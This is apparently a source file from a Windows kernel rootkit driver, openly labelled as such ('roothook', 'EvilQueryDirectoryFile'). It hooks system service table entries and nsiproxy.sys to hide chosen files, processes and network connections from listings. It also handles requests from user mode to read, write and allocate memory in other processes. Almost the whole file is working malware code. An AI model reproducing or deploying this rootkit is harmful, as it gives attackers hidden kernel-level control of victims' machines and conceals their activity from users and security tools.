#include "hooking.h"
#include "HookingGlobals.h"
#pragma warning(disable : 4996)
#pragma warning(disable : 4302)
#pragma warning(disable : 4311)
#pragma warning(disable : 4127)


BOOL roothook::CleanAllHooks() {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;


	// Unhook all hooked system services:
	//roothook::InfinityWrap::ReleaseInfinityHooks();
	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERY_TAG))) {
		return FALSE;
	}
	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERYEX_TAG))) {
		return FALSE;
	}
	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERYSYSINFO_TAG))) {
		return FALSE;
	}


	// Release IRP hook of nsiproxy.sys:
	if (!NT_SUCCESS(irphooking::ReleaseIrpHook(NSIPROXY_TAG, IRP_MJ_DEVICE_CONTROL))) {
		return FALSE;
	}


	// Unhide all processes by removing index 0:
	Status = process::DKUnhideProcess(0, 0);
	while (NT_SUCCESS(Status)) {
		Status = process::DKUnhideProcess(0, 0);
	}
	if (Status == STATUS_INVALID_PARAMETER) {
		return TRUE;
	}
	return FALSE;
}


NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=REQUEST LOG=-=-=-=-=-\n\n");
	DbgPrintEx(0, 0, "KMDFdriver HOOOOOKHANDLER (highest UM address = %p)\n", (PVOID)memory_helpers::GetHighestUserModeAddrADD());

	PVOID FileNameBuffer = NULL;
	UNICODE_STRING FileName = { 0 };
	ROOTKIT_MEMORY* RootkInstructions = (ROOTKIT_MEMORY*)hookedf_params;
	NTSTATUS Return = STATUS_SUCCESS;

	RootkInstructions->IsFlexible = FALSE;  // verify that operation was made and the transforming of data KM-UM
	switch (RootkInstructions->Operation) {
	case RKOP_MDLBASE:

		// Request process module address -
		DbgPrintEx(0, 0, "Request Type: get base address of module\n");
		Return = GetModuleBaseRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_WRITE:

		// Copy into memory -
		DbgPrintEx(0, 0, "Request Type: write data into memory\n");
		Return = WriteToMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_READ:

		// Read from memory -
		DbgPrintEx(0, 0, "Request Type: read data from memory\n");
		Return = ReadFromMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_SYSINFO:

		// get system information/s by request -
		DbgPrintEx(0, 0, "Request Type: get information about target system\n");
		Return = RetrieveSystemInformationRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_PRCMALLOC:

		// allocate specified memory in specified process -
		DbgPrintEx(0, 0, "Request Type: allocate memory in the virtual address space of a process\n");
		Return = AllocSpecificMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;

	case RKOP_HIDEFILE:

		// hide file/folder -
		DbgPrintEx(0, 0, "Request Type: hide file/folder (0xFFFFFFFFFFFFFFFF = hide, 0x7777FFFFFFFFFFFF = return list, else = remove by index (value = index),\nActual reserved value: %p\n", RootkInstructions->Reserved);
		
		// Handle additional preoperation dependencies:
		if ((ULONG64)RootkInstructions->Reserved == HIDE_FILE) {
			FileNameBuffer = ExAllocatePoolWithTag(NonPagedPool, RootkInstructions->Size, 'HfNb');
			if (FileNameBuffer == NULL) {
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_MEMORY_NOT_ALLOCATED, RootkInstructions);
			}
			RootkInstructions->Out = FileNameBuffer;
		}
		else if ((ULONG64)RootkInstructions->Reserved == SHOW_HIDDEN) {
			RootkInstructions->Buffer = HookHide.HideBuffer;
			RootkInstructions->Size = HookHide.BufferSize;
		}
		Return = HideFileObjectRK(RootkInstructions);
		if (Return == HIDE_TEMPSUC) {
			
			// Returned from regular file hiding:
			if (FileNameBuffer == NULL) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (impossible name buffer = NULL)\n");
				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_MEMORY_NOT_ALLOCATED, RootkInstructions);
			}
			FileName.Buffer = (WCHAR*)FileNameBuffer;
			FileName.Length = (USHORT)(wcslen((WCHAR*)FileNameBuffer) * sizeof(WCHAR));
			FileName.MaximumLength = FileName.Length;
			if (!HookHide.AddToHideFile(&FileName)) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to add file/folder name %wZ to hiding list)\n", FileName);
				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
				if (FileNameBuffer != NULL) {
					ExFreePool(FileNameBuffer);
				}
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInstructions);
			}
			else {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeded (Succeeded to add file/folder name %wZ to hiding list)\n", FileName);
				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
				if (FileNameBuffer != NULL) {
					ExFreePool(FileNameBuffer);
				}
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
			}
		}
		else if (Return == UNHIDE_TEMPSUC) {
			
			// Returned from removing file:
			if (!HookHide.RemoveFromHideFile((int)RootkInstructions->Reserved, &FileName)) {
				if (FileName.Buffer == NULL) {
					DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to remove file/folder at index %llu to hiding list)\n", (ULONG64)RootkInstructions->Reserved);
				}
				else {
					DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to remove file/folder at index %llu, name %wZ to hiding list)\n", (ULONG64)RootkInstructions->Reserved, FileName);
				}
				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInstructions);
			}
			else {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeeded (Succeeded to remove file/folder at index %llu, name %wZ to hiding list)\n", (ULONG64)RootkInstructions->Reserved, FileName);
				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
			}
		}
		else if (Return == SHOWHIDDEN_TEMPSUC) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeeded (Succeeded to transfer hidden list to medium, Count %lu, Size %lu, Divider %c)\n", HookHide.HideCount, HookHide.BufferSize, HookHide.HideDivider);
			DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
		}

		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to make basic operation)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		if (FileNameBuffer != NULL) {
			ExFreePool(FileNameBuffer);
		}
		return Return;

	case RKOP_HIDEPROC:

		// Hide process with DKOM:
		DbgPrintEx(0, 0, "Request Type: hide process via DKOM (1) / NtQuerySystemInformation hook (0) -> %d\n", IS_DKOM);
		Return = HideProcessRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;

	case RKOP_HIDEADDR:

		// Hide networking connections with IRP hook to nsiproxy.sys:
		DbgPrintEx(0, 0, "Request Type: hide networking connections with IRP hook to IRP_MJ_DEVICE_CONTROL of nsiproxy.sys\n");
		Return = HideNetworkConnectionRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;
	}
	return STATUS_SUCCESS;
}


NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan) {
	UNICODE_STRING RequestedDir = { 0 };
	UNICODE_STRING CurrentFile = { 0 };
	UNICODE_STRING SusFolder = { 0 };
	UNICODE_STRING QueryUnicode = { 0 };
	RtlInitUnicodeString(&SusFolder, L"9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097");
	RtlInitUnicodeString(&QueryUnicode, L"NtQueryDirectoryFile");

	IO_STATUS_BLOCK DirStatus = { 0 };
	QueryDirFile OgNtQueryDirectoryFile = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	BOOL IsDirSame = TRUE;
	BOOL IsSystemRoot = TRUE;
	PVOID HandleInfo = NULL;
	

	// Call the original NtQueryDirectoryFile:
	OgNtQueryDirectoryFile = (QueryDirFile)roothook::SSDT::GetOriginalSyscall(NTQUERY_TAG);
	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
		Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
		return Status;
	}


	// Allocate buffer for handle path (format - "\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\...\actualsearchdir) and get the handle path:
	HandleInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'KfHi');
	if (HandleInfo == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	RtlZeroMemory(HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1));  // Make sure no leftovers of path are in pool
	Status = ZwQueryInformationFile(FileHandle, &DirStatus, HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), FileNameInformation);
	if (!NT_SUCCESS(Status)) {
		ExFreePool(HandleInfo);
		return STATUS_UNSUCCESSFUL;
	}
	RtlInitUnicodeString(&RequestedDir, ((PFILE_NAME_INFORMATION)HandleInfo)->FileName);
	ExFreePool(HandleInfo);


	// Search if path starts with "9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097":
	SearchForInitialEvilDir(&RequestedDir, &IsSystemRoot, &IsDirSame, 2);
	
	
	// Filter results by type of information requested (both/bothid = fileexp,full/fullid=dir,cd):
	Status = IterateOverFiles(FileInformationClass, FileInformation, &DirStatus, &IsDirSame, &RequestedDir, &IsSystemRoot,
		&SusFolder, &QueryUnicode);
	if (Status == STATUS_INVALID_PARAMETER) {
		return STATUS_SUCCESS;  // type of information that is not traced, return success (nothing to change)
	}
	return Status;
}


NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	IN ULONG QueryFlags,
	IN PUNICODE_STRING FileName OPTIONAL) {
	UNICODE_STRING RequestedDir = { 0 };
	UNICODE_STRING CurrentFile = { 0 };
	UNICODE_STRING SusFolder = { 0 };
	UNICODE_STRING QueryExUnicode = { 0 };
	RtlInitUnicodeString(&SusFolder, L"9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097");
	RtlInitUnicodeString(&QueryExUnicode, L"NtQueryDirectoryFileEx");

	IO_STATUS_BLOCK DirStatus = { 0 };
	QueryDirFileEx OgNtQueryDirectoryFileEx = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	BOOL IsDirSame = TRUE;
	BOOL IsSystemRoot = TRUE;
	PVOID HandleInfo = NULL;
	UNICODE_STRING QueryUnicode = { 0 };

	
	// Call the original NtQueryDirectoryFile:
	OgNtQueryDirectoryFileEx = (QueryDirFileEx)roothook::SSDT::GetOriginalSyscall(NTQUERYEX_TAG);
	Status = OgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
		Length, FileInformationClass, QueryFlags, FileName);
	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
		return Status;
	}


	// Allocate buffer for handle path (format - "\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\...\actualsearchdir) and get the handle path:
	HandleInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'KfHi');
	if (HandleInfo == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	RtlZeroMemory(HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1));  // Make sure no leftovers of path are in pool
	Status = ZwQueryInformationFile(FileHandle, &DirStatus, HandleInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), FileNameInformation);
	if (!NT_SUCCESS(Status)) {
		ExFreePool(HandleInfo);
		return STATUS_UNSUCCESSFUL;
	}
	RtlInitUnicodeString(&RequestedDir, ((PFILE_NAME_INFORMATION)HandleInfo)->FileName);
	ExFreePool(HandleInfo);


	// Search if path starts with "9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097":
	SearchForInitialEvilDir(&RequestedDir, &IsSystemRoot, &IsDirSame, 2);


	// Filter results by type of information requested (both/bothid = fileexp,full/fullid=dir,cd):
	Status = IterateOverFiles(FileInformationClass, FileInformation, &DirStatus, &IsDirSame, &RequestedDir, &IsSystemRoot,
		&SusFolder, &QueryExUnicode);
	if (Status == STATUS_INVALID_PARAMETER) {
		return STATUS_SUCCESS;  // type of information that is not traced, return success (nothing to change)
	}
	return Status;
}


NTSTATUS roothook::EvilQuerySystemInformation(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	QuerySystemInformation OgNtQuerySystemInformation = NULL;
	PSYSTEM_PROCESS_INFORMATION CurrentProcess = NULL;
	PSYSTEM_PROCESS_INFORMATION PreviousProcess = NULL;
	PSYSTEM_PROCESS_INFORMATION PreviousCurrentProcess = NULL;
	ULONG ProcessCount = 0;
	

	// Call the original NtQuerySystemInformation:
	OgNtQuerySystemInformation = (QuerySystemInformation)roothook::SSDT::GetOriginalSyscall(NTQUERYSYSINFO_TAG);
	Status = OgNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (!NT_SUCCESS(Status) || SystemInformation == NULL || SystemInformationClass != SystemProcessInformation) {
		return Status;
	}


	// Patch processes list so it wont include my hidden processes:
	CurrentProcess = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
	PreviousProcess = CurrentProcess;
	while ((ULONG64)CurrentProcess != (ULONG64)PreviousCurrentProcess || ProcessCount == 0) {
		if (process::SIIsInHiddenProcesses((ULONG64)CurrentProcess->UniqueProcessId)) {
			if (CurrentProcess->NextEntryOffset == 0) {
				if (ProcessCount == 0) {
					DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
					DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQuerySystemInformation (Processes, Single): Found process %llu, hiding via request\n", (ULONG64)CurrentProcess->UniqueProcessId);
					DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
					SystemInformation = NULL;
					return STATUS_NOT_FOUND;
				}
				// Last process in the linked list:
				PreviousProcess->NextEntryOffset = 0;
			}
			else {
				PreviousProcess->NextEntryOffset = PreviousProcess->NextEntryOffset + CurrentProcess->NextEntryOffset;
			}
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQuerySystemInformation (Processes): Found process %llu, hiding via request\n", (ULONG64)CurrentProcess->UniqueProcessId);
			DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		}
		else {
			PreviousProcess = CurrentProcess;  // If CurrentProcess was hidden previous needs to stay in place
		}
		PreviousCurrentProcess = CurrentProcess;
		CurrentProcess = (PSYSTEM_PROCESS_INFORMATION)((ULONG64)CurrentProcess + CurrentProcess->NextEntryOffset);
		ProcessCount++;
	}
	return STATUS_SUCCESS;
}